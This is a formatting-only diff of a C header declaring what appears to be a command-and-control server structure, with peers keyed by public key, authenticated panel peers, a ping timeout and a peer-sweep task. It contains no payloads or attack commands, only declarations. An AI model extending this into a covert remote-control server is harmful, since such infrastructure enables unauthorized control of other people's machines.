@@ -1,24 +1,25 @@
 #ifndef LAIKA_CNC_H
 #define LAIKA_CNC_H
 
+#include "hashmap.h"
 #include "laika.h"
 #include "lpacket.h"
-#include "lsocket.h"
-#include "lpolllist.h"
 #include "lpeer.h"
+#include "lpolllist.h"
+#include "lsocket.h"
 #include "ltask.h"
-#include "hashmap.h"
 
 /* kill peers if they haven't ping'd within a minute */
 #define LAIKA_PEER_TIMEOUT 60 * 1000
 
 typedef bool (*tLaika_peerIter)(struct sLaika_peer *peer, void *uData);
 
-struct sLaika_cnc {
+struct sLaika_cnc
+{
     uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
     struct sLaika_socket sock;
     struct sLaika_pollList pList;
-    struct hashmap *peers; /* holds all peers, lookup using pubkey */
+    struct hashmap *peers;          /* holds all peers, lookup using pubkey */
     struct sLaika_peer **authPeers; /* holds connected panel peers */
     uint8_t **authKeys;
     int authKeysCount;
@@ -50,7 +51,8 @@ void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData)
 struct sLaika_peer *laikaC_getPeerByPub(struct sLaika_cnc *cnc, uint8_t *pub);
 
 /* kills peers who haven't ping'd in a while */
-void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData);
+void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task,
+                           clock_t currTick, void *uData);
 
 void laikaC_iterPeers(struct sLaika_cnc *cnc, tLaika_peerIter iter, void *uData);
 
